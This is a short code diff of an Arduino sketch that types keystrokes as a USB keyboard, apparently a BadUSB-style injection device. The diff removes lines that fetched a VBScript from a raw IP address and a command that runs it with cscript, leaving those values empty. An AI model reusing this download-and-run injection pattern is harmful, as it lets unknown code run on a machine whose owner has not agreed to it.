@@ -2,9 +2,9 @@
 void setup()
 {
 
-  String url = "http://39.106.106.202:12306/SystemInfo.vbs";
-  String scriptName = "SystemInfo.vbs";
-  String order = "cscript .\\SystemInfo.vbs > sysinfo.txt ; start .\\sysinfo.txt";
+  String url = "";
+  String scriptName = "";
+  String order = "";
   
   Keyboard.begin(); //初始化
   delay(1000);
